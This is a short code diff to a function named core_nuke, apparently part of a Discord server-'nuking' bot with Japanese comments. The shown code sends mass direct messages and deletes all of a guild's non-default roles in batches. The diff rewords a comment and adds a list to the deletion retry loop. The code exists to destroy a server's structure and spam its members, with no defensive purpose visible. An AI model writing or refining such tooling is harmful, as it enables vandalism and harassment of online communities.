@@ -174,7 +174,7 @@ async def core_nuke(guild, new_server_name=None):
     if dm_coros:
         await asyncio.gather(*dm_coros, return_exceptions=True)
 
-    # ロール削除（元のロールのみ）
+    # ロール削除（もともとあったロールのみ）
     roles_to_delete = [r for r in guild.roles if not r.is_default() and not r.managed]
     print(f"ロール削除開始: 対象 {len(roles_to_delete)}個")
 
@@ -184,6 +184,7 @@ async def core_nuke(guild, new_server_name=None):
     batch_size = 15
     attempt = 0
     current_roles = roles_to_delete[:]
+    remaining = []
     while len(current_roles) > 0 and attempt < 2:
         attempt += 1
         for i in range(0, len(current_roles), batch_size):
